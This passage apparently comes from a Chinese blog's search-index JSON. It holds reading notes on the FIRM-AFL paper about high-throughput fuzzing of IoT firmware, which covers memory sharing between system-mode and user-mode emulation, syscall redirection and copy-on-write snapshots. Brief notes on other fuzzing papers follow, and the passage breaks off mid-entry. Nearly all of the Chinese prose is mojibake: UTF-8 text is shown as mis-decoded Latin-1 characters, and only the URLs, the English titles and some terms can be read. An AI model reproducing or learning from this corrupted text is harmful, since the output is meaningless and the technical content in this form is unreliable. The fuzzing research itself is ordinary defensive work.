æ•ˆç‡é«˜ï¼šç”±äºååé‡æ˜¯æ¨¡ç³Šçš„ä¸»è¦å› ç´ ï¼Œå¢å¼ºçš„è¿‡ç¨‹æ¨¡æ‹Ÿéœ€è¦å°½å¯èƒ½é«˜æ•ˆã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå®ƒåº”è¯¥æ¥è¿‘çº¯ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿçš„æ€§èƒ½ã€‚ æ–¹æ³•æ¦‚è¿° é¦–å…ˆå›ºä»¶åœ¨ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿå™¨ä¸­å¯åŠ¨ï¼Œç”¨æˆ·çº§ç¨‹åºï¼ˆåŒ…æ‹¬è¦æ¨¡ç³Šæµ‹è¯•çš„ç¨‹åºï¼‰ä¹Ÿå¯åŠ¨ã€‚ å½“è¦æ¨¡ç³ŠåŒ–çš„ç¨‹åºåˆ°è¾¾é¢„å®šçš„ç‚¹ (ä¾‹å¦‚ï¼Œä¸»å‡½æ•°çš„å…¥å£ç‚¹ï¼Œæˆ–åœ¨æ¥æ”¶åˆ°ç¬¬ä¸€ä¸ªç½‘ç»œæ•°æ®åŒ…å) åï¼Œè¿›ç¨‹æ‰§è¡Œå°†è¿ç§»åˆ°ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿï¼Œä»¥è·å¾—è¾ƒé«˜çš„æ‰§è¡Œé€Ÿåº¦ã€‚åªæœ‰åœ¨æå°‘æ•°æƒ…å†µä¸‹ï¼Œæ‰ä¼šå°†æ‰§è¡Œè¿ç§»å›ç³»ç»Ÿæ¨¡å¼æ‰§è¡Œï¼Œä»¥ç¡®ä¿æ‰§è¡Œçš„æ­£ç¡®æ€§ã€‚ ä¸ºäº†æœ€å°åŒ–è¿ç§»æˆæœ¬ï¼Œå†…å­˜çŠ¶æ€åœ¨è¿™ä¸¤ç§æ¨¡æ‹Ÿæ¨¡å¼ä¹‹é—´å…±äº«ã€‚ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿå’Œç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿé€šè¿‡ RAM æ–‡ä»¶æ¥å®ç°å†…å­˜å…±äº«ã€‚ æ³¨æ„ï¼Œç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿå°† RAM æ–‡ä»¶è§†ä¸ºç‰©ç†å†…å­˜ï¼Œå› æ­¤é€šè¿‡ç‰©ç†åœ°å€è®¿é—®å®ƒï¼Œè€Œç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿé€šè¿‡è™šæ‹Ÿåœ°å€è®¿é—®å…±äº«å†…å­˜ã€‚ ç¨‹åºå…ˆåœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸‹è¿è¡Œï¼Œå½“å‡ºç°ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå€ŸåŠ© RAM æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿå™¨è¿ç§»åˆ°ç³»ç»Ÿæ¨¡å¼ä»¿çœŸå¤„ç†ç³»ç»Ÿè°ƒç”¨ã€‚å½“ç³»ç»Ÿè°ƒç”¨è¿”å›æ—¶ï¼Œæ¨¡æ‹Ÿå™¨è¿ç§»å›ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿã€‚ å†…å­˜æ˜ å°„ï¼ˆMemory Mappingï¼‰ å¼•å¯¼ï¼ˆbootstrappingï¼‰ åœ¨ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸­å¯åŠ¨ IoT å›ºä»¶ï¼Œå¹¶è¿›ä¸€æ­¥å¯åŠ¨æŒ‡å®šçš„ IoT ç¨‹åºã€‚é€šè¿‡ DECAF[23]ï¼ˆåŸºäºç³»ç»Ÿä»¿çœŸçš„åŠ¨æ€åˆ†æå¹³å°ï¼‰æä¾›çš„è™šæ‹Ÿæœºå†…çœè¿›è¡Œç›‘æ§æ‰§è¡Œæƒ…å†µï¼Œåœ¨æ‰§è¡Œè¾¾åˆ°é¢„å®š fork ç‚¹æ—¶éå†æŒ‡å®šè¿›ç¨‹çš„é¡µè¡¨ï¼Œæ”¶é›†è™šæ‹Ÿåˆ°ç‰©ç†çš„é¡µæ˜ å°„ä¿¡æ¯ï¼Œå¹¶å°†å…¶å‘é€åˆ°ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿç«¯ã€‚ç„¶åï¼Œå¯¹äºè™šæ‹Ÿåœ°å€ (va) åˆ°ç‰©ç†åœ°å€ (pa) çš„æ¯ä¸ªæ˜ å°„ï¼Œç”¨æˆ·æ¨¡å¼ä»¿çœŸç«¯é€šè¿‡è°ƒç”¨ mmap å»ºç«‹æ˜ å°„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å®é™…ä¸Šï¼Œæˆ‘ä»¬å°† RAM æ–‡ä»¶çš„ä¸€é¡µä»¥ç‰©ç†åœ°å€ä½œä¸ºåç§»é‡æ˜ å°„åˆ°æŒ‡å®šçš„è™šæ‹Ÿåœ°å€ã€‚å‚æ•° prot ç”±å¯¹åº”é¡µè¡¨é¡¹çš„ä¿æŠ¤ä½å†³å®šã€‚ä»è¿™ä¸€ç‚¹å¼€å§‹ï¼Œç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸­çš„æ‰§è¡Œæš‚åœï¼ŒCPU çŠ¶æ€è¢«å‘é€åˆ°ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿï¼Œç„¶ååœ¨é‚£é‡Œç»§ç»­æ‰§è¡Œã€‚ ç†è§£ï¼šè¿™é‡Œæ˜¯æŒ‡åœ¨ç¨‹åºåˆšå¯åŠ¨çš„æ—¶å€™å¦‚ä½•å°†ç³»ç»Ÿçº§ä»¿çœŸå’Œç”¨æˆ·çº§ä»¿çœŸçš„å†…å­˜è¿›è¡Œå…±äº«â€”â€”å°±æ˜¯å…ˆåœ¨ç³»ç»Ÿçº§ä»¿çœŸè¿è¡Œï¼Œç„¶åå°†é¡µè¡¨å‘é€åˆ°ç”¨æˆ·çº§ä»¿çœŸï¼Œæ„å»ºè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜çš„æ˜ å°„ï¼Œå®ç°ä¸¤ä¸ªæ¨¡å¼ä¸‹çš„å†…å­˜æ˜ å°„çš„ç»Ÿä¸€ã€‚è¿™ä¸ªéƒ¨åˆ†å°±æ˜¯åˆå§‹åŒ–ï¼ˆæ‰€ä»¥ç§°ä¹‹ä¸ºå¼•å¯¼ï¼‰ã€‚\né¡µé¢é”™è¯¯å¤„ç†ï¼ˆPage fault handingï¼‰ å½“å‘ç”Ÿé¡µé¢é”™è¯¯çš„æ—¶å€™å¦‚ä½•åè°ƒä¸¤ä¸ªæ¨¡å¼å‘¢ã€‚ä½œè€…ä¸ºç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­çš„é¡µé¢é”™è¯¯æ³¨å†Œäº†ä¸€ä¸ªä¿¡å·å¤„ç†ç¨‹åºï¼Œè¿™æ ·ä¸»æœºæ“ä½œç³»ç»Ÿå°±ä¼šå°†é¡µé¢é”™è¯¯äº‹ä»¶ä¼ é€’ç»™ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿã€‚å½“æ¥æ”¶åˆ°ä¿¡å·åï¼Œç”¨æˆ·æ¨¡å¼ä»¿çœŸå°† CPU çŠ¶æ€å‘é€åˆ°ç³»ç»Ÿæ¨¡å¼ä»¿çœŸç«¯ï¼ŒæœŸæœ›åœ¨ç³»ç»Ÿæ¨¡å¼ä»¿çœŸä¸­å¤„ç†é¡µé¢é”™è¯¯ï¼Œå¹¶ä¸ºæ•…éšœè™šæ‹Ÿåœ°å€å»ºç«‹æ–°çš„æ˜ å°„ã€‚ ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿæ¥æ”¶åˆ° CPU çŠ¶æ€å¹¶æ¢å¤æ‰§è¡Œåï¼ŒIoT å›ºä»¶æ“ä½œç³»ç»Ÿä¸­çš„é¡µé¢é”™è¯¯å¤„ç†ç¨‹åºå°†å“åº”æ­¤é¡µé¢é”™è¯¯å¹¶å°è¯•å»ºç«‹æ˜ å°„ã€‚ éš¾ç‚¹åœ¨äºå¦‚ä½•ç¡®å®šå‘ç”Ÿé”™è¯¯çš„æ—¶åˆ»ã€é¡µé¢æ˜ å°„å»ºç«‹çš„æ—¶åˆ» åŠæ—¶æ•æ‰ä¸¤ç§æ—¶åˆ»ï¼Œå¯ä»¥åŠæ—¶åˆ‡æ¢æ¨¡å¼ï¼Œæœ€å¤§é™åº¦æé«˜é€Ÿåº¦ å› ä¸ºæ“ä½œç³»ç»ŸåŒæ—¶å¤„ç†å¤šä¸ªä»»åŠ¡ï¼ŒåŒæ—¶å¯èƒ½ä¼šå‘ç”Ÿå¤§é‡çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ‰€ä»¥æœ‰éš¾åº¦ã€‚ ä½œè€…æ¯ä¸ªåŸºæœ¬å—çš„æœ«å°¾ï¼Œå¦‚æœå½“å‰æ‰§è¡Œåœ¨æŒ‡å®šçš„è¿›ç¨‹ (æˆ–çº¿ç¨‹) å†…ï¼Œåˆ™æ„å‘³ç€æ‰§è¡Œå·²ç»ä»å†…æ ¸è¿”å›åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç„¶ååœ¨ TLB è¡¨ä¸­æ‰¾åˆ°æ–°å»ºç«‹çš„æ˜ å°„ï¼Œè¿åŒ CPU çŠ¶æ€ä¸€å—å‘é€ç»™ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿï¼Œå®ƒå°†é€šè¿‡è°ƒç”¨ mmap åˆ›å»ºè¿™ä¸ªæ–°çš„æ˜ å°„å¹¶æ¢å¤æ‰§è¡Œã€‚ å¦‚æœç”±äºæŸç§åŸå› ï¼Œå‘ç”Ÿäº†é”™è¯¯ï¼Œè¿›ç¨‹è¢«ç»ˆæ­¢ï¼Œæˆ‘ä»¬å¯ä»¥ä¾é  DECAF[23]æä¾›çš„ VMI (è™šæ‹Ÿæœºè‡ªæ£€) åŠŸèƒ½æ¥è·å¾—é€šçŸ¥ï¼Œç„¶ååŒæ–¹çš„æ•´ä¸ªæ‰§è¡Œéƒ½è¢«ç»ˆæ­¢ã€‚ ç†è§£ï¼šç¨‹åºä¼šä¸€ç›´åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸‹è¿è¡Œï¼Œå½“å‘ç”Ÿé¡µé¢é”™è¯¯éœ€è¦ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠé”™è¯¯æŠ›ç»™ç³»ç»Ÿæ¨¡å¼ä»¿çœŸï¼Œç”±å®ƒå¤„ç†é—®é¢˜å»ºç«‹æ–°æ˜ å°„ï¼Œå¤„ç†å¥½äº†ç„¶ååˆ‡æ¢å›åˆ°ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿã€‚\né¢„åŠ è½½é¡µé¢æ˜ å°„ å› ä¸ºç°ä»£æ“ä½œç³»ç»Ÿä»¥æƒ°æ€§æ–¹å¼åŠ è½½å†…å­˜é¡µã€‚æ¯ä¸ªé¡µé¢æ˜ å°„å»ºç«‹çš„æ—¶åˆ»æ˜¯ç¬¬ä¸€æ¬¡è®¿é—®çš„é¡µé”™è¯¯ï¼Œä½†æ˜¯å¯¹äºä½œè€…çš„æ¨¡æ‹Ÿæ¥è¯´ï¼Œé¢‘ç¹çš„é¡µé”™è¯¯ä¼šæ‹–æ…¢æ¨¡ç³Šé€Ÿåº¦ã€‚ä½œè€…çš„è§£å†³æ–¹æ¡ˆæ˜¯å¯¹äºè¦æ¨¡ç³Šçš„ç¨‹åºçš„é¡µé¢è¿›è¡Œé¢„åŠ è½½ï¼Œåœ¨å¼•å¯¼é˜¶æ®µæ¨¡æ‹Ÿå¯¹ç¨‹åºæ¯ä¸ªä»£ç é¡µçš„è®¿é—®ï¼Œåœ¨ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸‹å°±è¿«ä½¿æ“ä½œç³»ç»Ÿå°†é¡µé¢å»ºç«‹å®Œæ•´ã€‚ ç³»ç»Ÿè°ƒç”¨é‡å®šå‘ å› ä¸ºä¸»æœºæ“ä½œç³»ç»Ÿæ²¡åŠæ³•å®Œå…¨å¤„ç†ç‰©è”ç½‘å›ºä»¶çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥éœ€è¦æŠŠç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­çš„ç³»ç»Ÿè°ƒç”¨é‡å®šå‘åˆ°ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿã€‚ æ›´å…·ä½“åœ°è¯´ï¼Œå½“ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿé‡åˆ°ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå®ƒæš‚åœæ‰§è¡Œï¼Œä¿å­˜å½“å‰ CPU çŠ¶æ€ï¼Œå¹¶å°†å…¶å‘é€ç»™ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿã€‚ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿæ¥æ”¶ CPU çŠ¶æ€å¹¶æ¢å¤æ‰§è¡Œã€‚è¿™å°†å¯¼è‡´å®¢æˆ·ç³»ç»Ÿä¸­çš„æ¨¡å¼åˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼ä»¥å¤„ç†ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚åŒæ ·ï¼Œç”±äºå®¢æˆ·æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯å¤šä»»åŠ¡çš„ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨è¿”å›ä¹‹å‰å¯èƒ½ä¼šå‘ç”Ÿè®¸å¤šä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å› æ­¤ï¼Œä¸å¤„ç†é¡µé¢é”™è¯¯çš„æ–¹å¼ç±»ä¼¼ï¼Œæˆ‘ä»¬å°†æ£€æµ‹æ¯ä¸ªåŸºæœ¬å—çš„æœ«å°¾ã€‚å¦‚æœå½“å‰åŸºæœ¬å—åœ¨å†…æ ¸ç©ºé—´ä¸­ï¼Œä½†æ˜¯ä¸‹ä¸€ä¸ªç¨‹åºè®¡æ•°å™¨åœ¨ç”¨æˆ·çº§åˆ«ï¼Œå¹¶ä¸”å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡æ˜¯ç”¨äºè¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„çº¿ç¨‹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ£€æµ‹ç³»ç»Ÿè°ƒç”¨è¿”å›çš„æ—¶åˆ»ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬æš‚åœç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸­çš„æ‰§è¡Œï¼Œä¿å­˜ CPU çŠ¶æ€ï¼Œå¹¶å°†å…¶ä¼ é€’å›ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿï¼Œç„¶åç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿå°†ç»§ç»­æ‰§è¡Œã€‚ ç†è§£ï¼šç®€å•æ¥è¯´ï¼Œè¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šå’Œé¡µé”™è¯¯ä¸€æ ·çš„ï¼Œå¤„ç†æ–¹æ³•ä¹Ÿä¸€æ ·ã€‚ ä¼˜åŒ–ä¸æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ ä½œè€…å‘ç°ç‰©è”ç½‘ç¨‹åºå‘å‡ºçš„è®¸å¤šç³»ç»Ÿè°ƒç”¨éƒ½å’Œæ–‡ä»¶ç³»ç»Ÿæœ‰å…³ã€‚ æ‰€ä»¥ä½œè€…é‡‡ç”¨ç›´æ¥è®²å›ºä»¶é•œåƒä¸­çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šï¼Œè¿™æ ·å½“å¤„äºæ¨¡æ‹Ÿä¸­çš„ç‰©è”ç½‘ç¨‹åºéœ€è¦è®¿é—®æ–‡ä»¶ç³»ç»Ÿæ—¶æ— éœ€åˆ‡æ¢åˆ°ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿä¸­ï¼Œå¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­é€šè¿‡ä¸»æœºæ“ä½œç³»ç»Ÿè®¿é—®æ–‡ä»¶ç³»ç»Ÿã€‚ Firm-AFL çš„è®¾è®¡å’Œå®ç° AFL çš„å·¥ä½œæµ AFL å¾ˆç†Ÿäº†ï¼Œä¸å†èµ˜è¿°ã€‚\nå¸¦æœ‰å¢å¼ºè¿›ç¨‹ä»¿çœŸçš„ AFL FIRM-AFL çš„å·®åˆ«åœ¨äºç”¨å¢å¼ºè¿›ç¨‹ä»¿çœŸä»£æ›¿äº† QEMU ã€‚\nå¼•å¯¼ æ²¡æœ‰æ–°ä¸œè¥¿ï¼Œå’Œå‰é¢è¯´çš„ä¸€æ ·ã€‚\nForking åŒºåˆ«äº AFL é»˜è®¤ main å‡½æ•°ä¸º fork ç‚¹ï¼Œæœ¬æ–‡å› ä¸ºæƒ³è¦æ‰¾é€šè¿‡ç½‘ç»œæ¥å£è§¦å‘çš„æ¼æ´ï¼Œæ‰€ä»¥ä¸ç½‘ç»œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€æ¬¡è°ƒç”¨éƒ½å°†ä½œä¸º fork ç‚¹ ä¸ä»…éœ€è¦ä¸ºç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿæ´¾ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿˜éœ€è¦ä¸ºç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿâ€œæ´¾ç”Ÿâ€ä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºå®ä¾‹ï¼Œå› ä¸ºä¸¤ç§æ¨¡å¼å¿…é¡»å½¼æ­¤åŒæ­¥ã€‚ä½†æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºä»£ä»·å¤ªé«˜ï¼Œæ‰€ä»¥ä½œè€…é€‰æ‹©åœ¨ fork ç‚¹åˆ›å»ºå¿«ç…§çš„æ–¹å¼ã€‚ QEMU æä¾›äº†å¿«ç…§åŠŸèƒ½ï¼Œå°†æ‰€æœ‰ CPU å¯„å­˜å™¨å’Œå†…å­˜ç©ºé—´ä¿å­˜åˆ°ç‰¹å®šçš„æ–‡ä»¶ä¸­ã€‚ï¼Œä½†æ˜¯æ–‡ä»¶çš„è¯»å†™æ“ä½œè¿˜æ˜¯éå¸¸æ…¢ã€‚ä½œè€…å®ç°äº†ä¸€ç§åŸºäºå†™æ—¶æ‹·è´åŸåˆ™çš„è½»é‡çº§å¿«ç…§æœºåˆ¶ã€‚ åŸç†æ˜¯ä¸å…¨éƒ¨è®°å½•åˆå§‹çš„å†…å­˜çŠ¶æ€ï¼Œåªè®°å½•é‚£äº›åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè¢«ä¿®æ”¹çš„é¡µçš„åˆå§‹çŠ¶æ€ã€‚å½“æ–°ä¸€è½®çš„ fuzz è¦å¼€å§‹æ—¶ï¼Œå°†ä¿å­˜çš„é¡µçš„åˆå§‹çŠ¶æ€å†™å›ã€‚ æ›´å…·ä½“åœ°è¯´ï¼Œæˆ‘ä»¬é¦–å…ˆå°†æ˜ å°„åˆ°ç³»ç»Ÿæ¨¡å¼ QEMU çš„ RAM æ–‡ä»¶æ ‡è®°ä¸ºåªè¯»ã€‚ç„¶åå†…å­˜å†™å…¥å°†å¯¼è‡´é¡µé¢é”™è¯¯ã€‚æˆ‘ä»¬å¤åˆ¶è¯¥é¡µï¼Œç„¶åå°†è¯¥é¡µæ ‡è®°ä¸ºå¯å†™ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è®°å½•åœ¨ä¸€æ¬¡æ¨¡ç³Šæ‰§è¡ŒæœŸé—´ä¿®æ”¹è¿‡çš„æ‰€æœ‰å†…å­˜é¡µã€‚åœ¨æ¢å¤å¿«ç…§æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¿™äº›è®°å½•çš„é¡µé¢å†™å›ã€‚ ç†è§£ï¼šä½œè€…åœ¨æ­¤éƒ¨åˆ†çš„å·¥ä½œåˆ›æ–°ç‚¹ä¸»è¦æ˜¯è¿™ä¸ªå¿«ç…§æœºåˆ¶ï¼Œåªè®°å½•ä¼šå˜çš„ï¼Œä¸å˜çš„ä¸å»åŠ¨å®ƒã€‚ Feeding input è¾“å…¥é€šè¿‡æ£€æµ‹ç³»ç»Ÿè°ƒç”¨æä¾›ã€‚å¯¹äºä»ç½‘ç»œæ¥å£æ¥æ”¶è¾“å…¥çš„ç‰©è”ç½‘ç¨‹åºï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­æ£€æµ‹ä¸ç½‘ç»œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤ä¸éœ€è¦å°†è¿™äº›ç³»ç»Ÿè°ƒç”¨é‡å®šå‘åˆ°ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿã€‚ ç†è§£ï¼šå› ä¸ºè¾“å…¥æ˜¯æˆ‘ä»¬æä¾›çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸‹æˆªè·å¯¹ç½‘ç»œè¾“å…¥çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥æŠŠè¾“å…¥ feedï¼Œä¸ç”¨åˆ‡æ¢åˆ°ç³»ç»Ÿæ¨¡æ‹Ÿæ¨¡å¼ä¸‹ã€‚\næ”¶é›†è¦†ç›–ä¿¡æ¯ ç”±äºå¤§å¤šæ•°æ‰§è¡Œéƒ½å‘ç”Ÿåœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­ï¼Œè€Œç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿåªéœ€è¦å¤„ç†é¡µé¢é”™è¯¯å’Œä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åœ¨ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿä¸­é‡‡å– AFL çš„æ”¶é›†è¦†ç›–ä¿¡æ¯çš„æªæ–½â€”â€”è®¡ç®—è¦†ç›–ä½å›¾ã€‚ è¯„ä»· é—®é¢˜ é€æ˜åº¦ã€‚èƒ½å¦ä»ç‰©è”ç½‘å›ºä»¶ä¸­æå– FIRM-AFL fuzz ç¨‹åºï¼Œå°±åƒå®ƒä»¬åœ¨å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨ä¸­è¿è¡Œä¸€æ ·? æ•ˆç‡é«˜ã€‚FIRM-AFL çš„ååé‡ (æ‰§è¡Œ/ç§’) ä¸åŸºäºçº¯ç”¨æˆ·æ¨¡å¼ä»¿çœŸçš„æ¨¡ç³Šå™¨çš„ååé‡æœ‰å¤šæ¥è¿‘? ä¼˜åŒ–çš„æœ‰æ•ˆæ€§ã€‚æˆ‘ä»¬çš„ä¼˜åŒ–æŠ€æœ¯æ˜¯å¦æˆåŠŸåœ°è§£å†³äº†æˆ‘ä»¬ç¡®å®šçš„æ€§èƒ½ç“¶é¢ˆ? æ¼æ´å‘ç°çš„æœ‰æ•ˆæ€§ã€‚FIRM-AFL åœ¨ç‰©è”ç½‘å›ºä»¶ä¸­å‘ç°çœŸæ­£æ¼æ´çš„æœ‰æ•ˆæ€§å¦‚ä½•? ç–‘é—® å…¨ç³»ç»Ÿä»¿çœŸå’Œç”¨æˆ·æ¨¡å¼ä»¿çœŸçš„åŒºåˆ«æ˜¯å•¥ å…³äº qume çš„ä»¿çœŸåŸç† Mmap å‡½æ•° ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/firm-afl_-high-throughput-greybox-fuzzing-of-iot-firmware-via-augmented-process-emulation/","summary":"ä¸­æ–‡è¯‘åï¼šFIRM-AFLï¼šé€šè¿‡å¢å¼ºè¿‡ç¨‹ä»¿çœŸå®ç°çš„ç‰©è”ç½‘å›ºä»¶çš„é«˜é€šé‡ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šéƒ‘ yaowen å•ä½ï¼šä¸­å›½ç§‘å­¦é™¢ä¿¡æ¯å·¥ç¨‹ç ”ç©¶æ‰€åŒ—äº¬ç‰©è”ç½‘é‡ç‚¹å®éªŒå®¤","title":"FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation"},{"content":"#TODO [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]]\nå˜å¼‚ç­–ç•¥åˆ†ä¸ºç²—ç»†ç²’åº¦ ç²—ç²’åº¦ï¼šå°†æ¯æ¬¡çš„è¾“å…¥ç§°ä¹‹ä¸ºæ¨¡ç³Šå®ä¾‹ï¼Œæµ‹é‡æ¨¡ç³Šå®ä¾‹å’Œè„†å¼±å‡½æ•°ä¹‹é—´çš„è·ç¦»ï¼ˆè·ç¦»æ˜¯ä¸¤è€…ä¹‹é—´æœ€çŸ­è·¯å¾„çš„èŠ‚ç‚¹æ•°ï¼‰ï¼Œè·ç¦»è¶Šå°çš„è¾“å…¥ä½œä¸ºæ–°ç§å­çš„ä¼˜å…ˆçº§è¶Šé«˜ ç²—ç²’åº¦ä¸»è¦ä¿®æ”¹çš„æ˜¯ç³»ç»Ÿè°ƒç”¨åºåˆ— ç»†ç²’åº¦ï¼šå’Œç²—ç²’åº¦å·®ä¸å¤šï¼Œä½†æ˜¯è·ç¦»æ˜¯ä¸¤ä¸ªåŸºæœ¬å—ä¹‹é—´çš„è·ç¦» ç»†ç²’åº¦ä¸»è¦ä¿®æ”¹çš„æ˜¯å‚æ•°å€¼ [[BEACON Directed Grey-Box Fuzzing with Provable Path Pruning]]\næœ¬æ–‡æä¾›äº†ä¸€ä¸ªç¬¦å·æ‰§è¡Œæ±‚è§£æ¡ä»¶åœ¨fuzzåº”ç”¨ä¸Šçš„ä¸€ä¸ªæŠ˜ä¸­çš„æ–¹æ³•ã€‚ä»è„†å¼±å‡½æ•°å‘ä¸Šä¸€ç›´åˆ°å…¥å£å‡½æ•°ï¼ŒæŠŠæ¡ä»¶ç§¯ç´¯ã€‚ä¸å»ç®—ç¬¦å·çš„å€¼ï¼Œè€Œæ˜¯å»ç®—ç¬¦å·å€¼çš„èŒƒå›´ã€‚è¿™æ ·å°±å¯ä»¥å°†å¾ˆå¤§ä¸€æ‰¹éšæœºå˜å¼‚å¾—åˆ°çš„è¾“å…¥ç»™æ’é™¤æ‰ã€‚ [[ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery]]\nå’Œsemfuzzä¸€æ ·æ¥è‡ªæ¸¸ä¼Ÿè€å¸ˆ æœ¬æ–‡çš„ç‚¹åœ¨äºå¯ä»¥è‡ªåŠ¨çš„æ¢æµ‹è¢«fuzzå¯¹è±¡çš„è¾“å…¥æ ¼å¼ï¼ˆå¯èƒ½è¿˜åˆ°ä¸äº†è¾“å…¥æ ¼å¼è¿™ä¸ªç¨‹åº¦ï¼‰ï¼Œä¾æ®åé¦ˆå°†ç›¸åŒåé¦ˆçš„å­—èŠ‚è¿æ¥å½¢æˆå­—æ®µï¼Œå¹¶ä¸”è¯†åˆ«å­—æ®µçš„ç±»å‹ï¼ˆä½œè€…è‡ªå·±å®šä¹‰äº†å‡ ä¸ªç±»å‹ï¼‰ã€‚ç„¶åå†è¿›è¡Œfuzzã€‚ å¥½å¤„åœ¨äºå­—èŠ‚è¿æ¥æˆå­—æ®µåï¼Œå¯ä»¥æœ‰æ•ˆçš„è¿›è¡Œå˜å¼‚ï¼Œå°±å‡å°‘é‚£äº›æ ¹æœ¬è¾“å…¥éƒ½è¾“å…¥ä¸äº†çš„è¾“å…¥å®ä¾‹ã€‚æé«˜fuzzæ•ˆç‡ã€‚ [[Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing]]\nä½œè€…è®¤ä¸ºæ™ºèƒ½ç”µè§†çš„å®‰å“æ“ä½œç³»ç»Ÿä¸­æœ‰å¾ˆå¤šå‚å•†è‡ªå®šä¹‰æ·»åŠ çš„APIï¼Œè¿™ç§APIå­˜åœ¨æ¼æ´çš„é£é™©æ¯”è¾ƒé«˜ï¼Œä½œè€…ä¸“æ³¨äºfuzzè¿™ç§API ä½œè€…é¦–å…ˆå®šä½API ç„¶åå¯¹API fuzzï¼Œæ”¶é›†æ—¥å¿—ä¿¡æ¯ é¦–å…ˆè¿‡æ»¤å’Œç›®æ ‡APIæ— å…³çš„æ—¥å¿—ä¿¡æ¯ ç„¶åé€šè¿‡ä¸€ä¸ªè®­ç»ƒå¥½çš„åˆ†ç±»å™¨æ¥è¯†åˆ«è¿‡æ»¤åçš„æ—¥å¿—ä¿¡æ¯ä¸­å“ªäº›å’Œè¾“å…¥éªŒè¯ç›¸å…³ [[SeededFuzz Selecting and Generating Seeds for Directed Fuzzing]] [[Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators]]\nè¿™ç¯‡æ–‡ç« 